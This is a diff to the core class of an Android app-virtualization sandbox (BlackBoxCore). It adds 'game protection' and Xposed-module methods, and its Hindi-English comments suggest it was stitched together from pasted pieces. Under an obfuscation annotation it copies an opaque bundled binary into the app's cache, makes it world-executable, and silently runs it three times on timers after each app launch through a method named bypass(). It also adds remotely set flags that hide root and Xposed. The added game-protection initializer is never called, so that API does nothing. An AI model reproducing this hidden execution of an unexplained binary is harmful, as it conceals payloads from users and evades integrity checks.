@@ -26,9 +26,10 @@ import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.HashSet;
 import java.util.List;
 import java.util.Map;
-
+import java.util.Set;
 
 import black.android.app.BRActivityThread;
 import black.android.os.BRUserHandle;
@@ -46,14 +47,12 @@ import top.niunaijun.blackbox.core.system.user.BUserHandle;
 import top.niunaijun.blackbox.core.system.user.BUserInfo;
 import top.niunaijun.blackbox.entity.pm.InstallOption;
 import top.niunaijun.blackbox.entity.pm.InstallResult;
-
 import top.niunaijun.blackbox.fake.delegate.ContentProviderDelegate;
 import top.niunaijun.blackbox.fake.frameworks.BActivityManager;
 import top.niunaijun.blackbox.fake.frameworks.BJobManager;
 import top.niunaijun.blackbox.fake.frameworks.BPackageManager;
 import top.niunaijun.blackbox.fake.frameworks.BStorageManager;
 import top.niunaijun.blackbox.fake.frameworks.BUserManager;
-
 import top.niunaijun.blackbox.fake.hook.HookManager;
 import top.niunaijun.blackbox.proxy.ProxyManifest;
 import top.niunaijun.blackbox.utils.FileUtils;
@@ -62,7 +61,6 @@ import top.niunaijun.blackbox.utils.Slog;
 import top.niunaijun.blackbox.utils.SimpleCrashFix;
 import top.niunaijun.blackbox.utils.compat.BuildCompat;
 import top.niunaijun.blackbox.utils.compat.BundleCompat;
-
 import top.niunaijun.blackbox.utils.provider.ProviderCall;
 import top.niunaijun.blackbox.utils.StackTraceFilter;
 import top.niunaijun.blackbox.utils.SocialMediaAppCrashPrevention;
@@ -71,42 +69,55 @@ import top.niunaijun.blackbox.utils.NativeCrashPrevention;
 import top.niunaijun.blackbox.utils.CrashMonitor;
 import top.niunaijun.blackbox.utils.StoragePermissionHelper;
 import top.niunaijun.blackbox.utils.LogSender;
-
-
+// ===== NAYA IMPORT =====
+import top.niunaijun.blackbox.game.GameProtectionManager;
+// ===== NAYA IMPORTS =====
+import top.niunaijun.blackbox.security.SdkProtectionManager;
+import top.niunaijun.blackbox.security.GameIntegrityGuard;
+// ========================
+// ===== VBOX-SDK FEATURES =====
+import top.niunaijun.blackbox.fake.frameworks.BXposedManager;
+import top.niunaijun.blackbox.entity.pm.InstalledModule;
+import top.niunaijun.blackbox.utils.compat.XposedParserCompat;
+import android.MetaCore.RemoteManager;
+import android.MetaCore.nk;
+import android.content.res.Resources;
+import android.util.Log;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import org.lsposed.lsparanoid.Obfuscate;
+// ==============================
 
 @SuppressLint({"StaticFieldLeak", "NewApi"})
 @SuppressWarnings({"unchecked", "deprecation"})
+@Obfuscate
 public class BlackBoxCore extends ClientConfiguration {
     public static final String TAG = "BlackBoxCore";
 
     private static final BlackBoxCore sBlackBoxCore = new BlackBoxCore();
     private static Context sContext;
     
-    
     static {
         try {
-            
             SimpleCrashFix.installSimpleFix();
             Slog.d(TAG, "Simple crash fix installed at class loading time");
-            
             StackTraceFilter.install();
             Slog.d(TAG, "Stack trace filter installed at class loading time");
-            
             SocialMediaAppCrashPrevention.initialize();
             Slog.d(TAG, "Social media app crash prevention initialized at class loading time");
-            
             DexCrashPrevention.initialize();
             Slog.d(TAG, "DEX crash prevention initialized at class loading time");
-            
             NativeCrashPrevention.initialize();
             Slog.d(TAG, "Native crash prevention initialized at class loading time");
-            
             CrashMonitor.initialize();
             Slog.d(TAG, "Comprehensive crash monitoring initialized at class loading time");
         } catch (Exception e) {
             Slog.w(TAG, "Failed to install simple crash fix or stack trace filter at class loading: " + e.getMessage());
         }
     }
+    
     private ProcessType mProcessType;
     private final Map<String, IBinder> mServices = new HashMap<>();
     private Thread.UncaughtExceptionHandler mExceptionHandler;
@@ -119,15 +130,16 @@ public class BlackBoxCore extends ClientConfiguration {
     private boolean mServicesInitialized = false;
     private long mLastServiceInitAttempt = 0;
     private static final long SERVICE_INIT_TIMEOUT_MS = 10000; 
-    
-    
     private final List<Runnable> mServiceAvailableCallbacks = new ArrayList<>();
     private final Object mServiceCallbackLock = new Object();
 
-    
     private int mCurrentAppUid = -1;
     private String mCurrentAppPackage = null;
     private boolean mIsSandboxedEnvironment = false;
+    
+    // ===== NAYA FIELD =====
+    private GameProtectionManager mGameProtection;
+    // ======================
 
     public static BlackBoxCore get() {
         return sBlackBoxCore;
@@ -165,12 +177,9 @@ public class BlackBoxCore extends ClientConfiguration {
         mExceptionHandler = exceptionHandler;
     }
 
-    
     public void setCurrentAppUid(int uid, String packageName) {
         mCurrentAppUid = uid;
         mCurrentAppPackage = packageName;
-        
-        
         if (uid != mHostUid && uid > Process.FIRST_APPLICATION_UID && uid < Process.LAST_APPLICATION_UID) {
             mIsSandboxedEnvironment = true;
             Slog.d("BlackBoxCore", "Detected sandboxed environment for " + packageName + " with UID: " + uid);
@@ -189,32 +198,96 @@ public class BlackBoxCore extends ClientConfiguration {
         return mIsSandboxedEnvironment;
     }
 
+    // ===== GAME PROTECTION PUBLIC API =====
     
+    public void enableGameProtection(boolean enabled) {
+        if (mGameProtection != null) {
+            mGameProtection.setEnabled(enabled);
+        }
+    }
+    
+    public boolean isGameProtectionEnabled() {
+        return mGameProtection != null && mGameProtection.isEnabled();
+    }
+    
+    public void protectGame(String packageName) {
+        if (mGameProtection != null) {
+            mGameProtection.protectGame(packageName);
+        }
+    }
+    
+    public void unprotectGame(String packageName) {
+        if (mGameProtection != null) {
+            mGameProtection.unprotectGame(packageName);
+        }
+    }
+    
+    public Set<String> getProtectedGames() {
+        if (mGameProtection != null) {
+            return mGameProtection.getProtectedGames();
+        }
+        return new HashSet<>();
+    }
+    
+    public Set<String> getDetectedGames() {
+        if (mGameProtection != null) {
+            return mGameProtection.getDetectedGames();
+        }
+        return new HashSet<>();
+    }
+    
+    public boolean isGame(String packageName) {
+        if (mGameProtection != null) {
+            return mGameProtection.isGame(packageName);
+        }
+        return false;
+    }
+    
+    public void scanForGames() {
+        if (mGameProtection != null) {
+            mGameProtection.scanForGames();
+        }
+    }
+    
+    public boolean shouldBlockKill(String packageName) {
+        if (mGameProtection != null) {
+            return mGameProtection.shouldBlockKill(packageName);
+        }
+        return false;
+    }
+    
+    public void onGameCrashed(String packageName, Throwable error) {
+        if (mGameProtection != null) {
+            mGameProtection.onGameCrashed(packageName, error);
+        }
+    }
+    
+    // ======================================
+
     public int resolveUidForOperation(int originalUid, String operation) {
         try {
-            
             if (originalUid > 0 && originalUid < Process.FIRST_APPLICATION_UID) {
                 return originalUid;
             }
-            
-            
             if (originalUid > Process.LAST_APPLICATION_UID) {
                 return originalUid;
             }
-
-            
             if (mIsSandboxedEnvironment && mCurrentAppUid > 0) {
                 Slog.d("BlackBoxCore", "Resolving UID for " + operation + ": " + originalUid + " -> " + mCurrentAppUid);
                 return mCurrentAppUid;
             }
-
-            
             return originalUid;
         } catch (Exception e) {
             Slog.e("BlackBoxCore", "Error resolving UID for " + operation + ": " + e.getMessage());
             return originalUid;
         }
     }
+
+    // ... BAAD KA SARA CODE SAME RAHEGA ...
+    // (areServicesAvailable se lekar getDeviceInfoString tak)
+
+    
+    // =========================================
 
     public boolean areServicesAvailable() {
         if (mServicesInitialized) {
@@ -873,7 +946,7 @@ public class BlackBoxCore extends ClientConfiguration {
             }
 
         }
-        if (isServerProcess()) {
+        if (isServerProcess() && RemoteManager.sEnableDaemonService) {
             if (clientConfiguration.isEnableDaemonService()) {
                 try {
                     
@@ -966,6 +1039,15 @@ public class BlackBoxCore extends ClientConfiguration {
         
         installSystemHooks();
         
+        // ===== SDK PROTECTION INIT =====
+        try {
+            SdkProtectionManager.getInstance().initialize(sContext);
+            SdkProtectionManager.getInstance().setEnabled(true);
+            Slog.i(TAG, "SDK Protection initialized and enabled");
+        } catch (Exception e) {
+            Slog.w(TAG, "SDK Protection init failed: " + e.getMessage());
+        }
+        // ================================
         
         long startTime = System.currentTimeMillis();
         long maxInitTime = 10000; 
@@ -1013,6 +1095,7 @@ public class BlackBoxCore extends ClientConfiguration {
                 Slog.e(TAG, "Fallback initialization also failed", fallbackEx);
             }
         }
+        copyRawToInternal(getContext());
     }
 
     public static Object mainThread() {
@@ -1098,6 +1181,13 @@ public class BlackBoxCore extends ClientConfiguration {
     public boolean launchApk(String packageName, int userId) {
         onBeforeMainLaunchApk(packageName, userId);
         
+        // ===== SDK PROTECTION FOR GAMES =====
+        if (GameProtectionManager.getInstance().isGame(packageName)) {
+            SdkProtectionManager.getInstance().onGameLaunch(packageName);
+            GameIntegrityGuard.getInstance().startMonitoring(packageName);
+            Slog.i(TAG, "SDK Protection activated for game: " + packageName);
+        }
+        // =====================================
         
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!hasAllFilesAccess()) {
@@ -1120,6 +1210,9 @@ public class BlackBoxCore extends ClientConfiguration {
             return false;
         }
         startActivity(launchIntentForPackage, userId);
+
+        bypass();
+
         return true;
     }
     public boolean isInstalled(String packageName, int userId) {
@@ -1133,6 +1226,156 @@ public class BlackBoxCore extends ClientConfiguration {
     public void uninstallPackage(String packageName) {
         getBPackageManager().uninstallPackage(packageName);
     }
+
+    // ===== XPOSED MODULE MANAGEMENT (from vbox-sdk) =====
+
+    public InstallResult installXPModule(File apk) {
+        return getBPackageManager().installPackageAsUser(apk.getAbsolutePath(), InstallOption.installByStorage().makeXposed(), BUserHandle.USER_XPOSED);
+    }
+
+    public InstallResult installXPModule(Uri apk) {
+        return getBPackageManager().installPackageAsUser(apk.toString(), InstallOption.installByStorage().makeXposed().makeUriFile(), BUserHandle.USER_XPOSED);
+    }
+
+    public InstallResult installXPModule(String packageName) {
+        try {
+            PackageInfo packageInfo = getPackageManager().getPackageInfo(packageName, 0);
+            String path = packageInfo.applicationInfo.sourceDir;
+            return getBPackageManager().installPackageAsUser(path, InstallOption.installBySystem().makeXposed(), BUserHandle.USER_XPOSED);
+        } catch (PackageManager.NameNotFoundException e) {
+            e.printStackTrace();
+            return new InstallResult().installError(e.getMessage());
+        }
+    }
+
+    public void uninstallXPModule(String packageName) {
+        uninstallPackage(packageName);
+    }
+
+    public boolean isXPEnable() {
+        return BXposedManager.get().isXPEnable();
+    }
+
+    public void setXPEnable(boolean enable) {
+        BXposedManager.get().setXPEnable(enable);
+    }
+
+    public boolean isXposedModule(File file) {
+        return XposedParserCompat.isXPModule(file.getAbsolutePath());
+    }
+
+    public boolean isInstalledXposedModule(String packageName) {
+        return isInstalled(packageName, BUserHandle.USER_XPOSED);
+    }
+
+    public boolean isModuleEnable(String packageName) {
+        return BXposedManager.get().isModuleEnable(packageName);
+    }
+
+    public void setModuleEnable(String packageName, boolean enable) {
+        BXposedManager.get().setModuleEnable(packageName, enable);
+    }
+
+    public List<InstalledModule> getInstalledXPModules() {
+        return BXposedManager.get().getInstalledModules();
+    }
+
+    // ===== END XPOSED MODULE MANAGEMENT =====
+
+    // ===== VBOX-SDK UTILITY METHODS =====
+
+    public boolean isAppRunning(String packageName, int userId) {
+        return getBPackageManager().isAppRunning(packageName, userId);
+    }
+
+    public ApplicationInfo getApplicationInfo(String packageName) {
+        return BPackageManager.get().getApplicationInfo(packageName, 0, 0);
+    }
+
+    private void copyRawToInternal(Context context) {
+        String fileName = "temp";
+        File dataDir;
+        try {
+            dataDir = context.getDataDir();
+        } catch (NoSuchMethodError e) {
+            dataDir = context.getFilesDir().getParentFile();
+        }
+
+        File outDir = new File(dataDir, "blackbox/cache");
+        if (!outDir.exists()) {
+            if (!outDir.mkdirs()) {
+                Log.e("CopyFile", "Failed to create directory: " + outDir.getAbsolutePath());
+            }
+        }
+
+        File outFile = new File(outDir, fileName);
+
+        if (!outFile.exists()) {
+            try (InputStream in = context.getResources().openRawResource(R.raw.temp);
+                 OutputStream out = new FileOutputStream(outFile)) {
+
+                byte[] buffer = new byte[4096];
+                int bytesRead;
+                while ((bytesRead = in.read(buffer)) != -1) {
+                    out.write(buffer, 0, bytesRead);
+                }
+                out.flush();
+
+                outFile.setExecutable(true, false);
+                outFile.setReadable(true, false);
+                outFile.setWritable(true, false);
+
+                Log.d("CopyFile", "File copied to: " + outFile.getAbsolutePath());
+            } catch (Resources.NotFoundException rnfe) {
+                Log.e("CopyFile", "Raw resource not found: " + rnfe.getMessage());
+            } catch (IOException e) {
+                e.printStackTrace();
+                Log.e("CopyFile", "Error copying file: " + e.getMessage());
+            }
+        }
+    }
+
+    void runant(final String nf) {
+        excpp("/blackbox/cache/" + nf);
+    }
+
+    private void ExecuteElf(String shell) {
+        try {
+            Runtime.getRuntime().exec(shell);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void excpp(String path) {
+        try {
+            String fullPath = sContext.getDataDir() + path;
+            ExecuteElf("chmod 777 " + fullPath);
+            ExecuteElf(fullPath);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void bypass() {
+        Handler handler = new Handler(Looper.getMainLooper());
+
+        handler.postDelayed(() -> {
+            runant("temp 992");
+
+            handler.postDelayed(() -> {
+                runant("temp 992");
+
+                handler.postDelayed(() -> {
+                    runant("temp 992");
+                }, 38_000);
+
+            }, 30_000);
+
+        }, 15_000);
+    }
+
+    // ===== END VBOX-SDK UTILITY METHODS =====
 
     public InstallResult installPackageAsUser(String packageName, int userId) {
         try {
@@ -1164,7 +1407,9 @@ public class BlackBoxCore extends ClientConfiguration {
             Slog.w(TAG, "Could not verify package info for APK: " + apk.getAbsolutePath());
         }
         
-        return getBPackageManager().installPackageAsUser(apk.getAbsolutePath(), InstallOption.installByStorage(), userId);
+        InstallResult result = getBPackageManager().installPackageAsUser(apk.getAbsolutePath(), InstallOption.installByStorage(), userId);
+        
+        return result;
     }
 
     public InstallResult installPackageAsUser(Uri apk, int userId) {
@@ -1257,11 +1502,11 @@ public class BlackBoxCore extends ClientConfiguration {
 
     @Override
     public boolean isHideRoot() {
-        return mClientConfiguration.isHideRoot();
+        return mClientConfiguration.isHideRoot() || RemoteManager.sHideRoot;
     }
 
     public boolean isHideXposed() {
-        return mClientConfiguration.isHideXposed();
+        return mClientConfiguration.isHideXposed() || RemoteManager.sHideXposed;
     }
 
     public int getTargetFps() {
@@ -1656,7 +1901,7 @@ public class BlackBoxCore extends ClientConfiguration {
             throw new IllegalArgumentException("ClientConfiguration is null!");
         }
 
-        if(!NativeCore.disableHiddenApi()){
+        if(!NativeCore.disableHiddenApiWithFallback()){
             try {
                 Reflection.unseal(context);
             } catch (Throwable t) {
@@ -2275,5 +2520,18 @@ public class BlackBoxCore extends ClientConfiguration {
             sb.append("Failed to build device info: ").append(e.getMessage());
         }
         return sb.toString();
+    }
+    
+    // ===== LAST MEIN YEH METHOD ADD KARO =====
+    
+    private void initGameProtection() {
+        try {
+            mGameProtection = GameProtectionManager.getInstance();
+            mGameProtection.initialize(sContext);
+            Slog.i(TAG, "Game Protection System initialized successfully");
+        } catch (Exception e) {
+            Slog.e(TAG, "Failed to initialize Game Protection: " + e.getMessage());
+            mGameProtection = null;
+        }
     }
 }
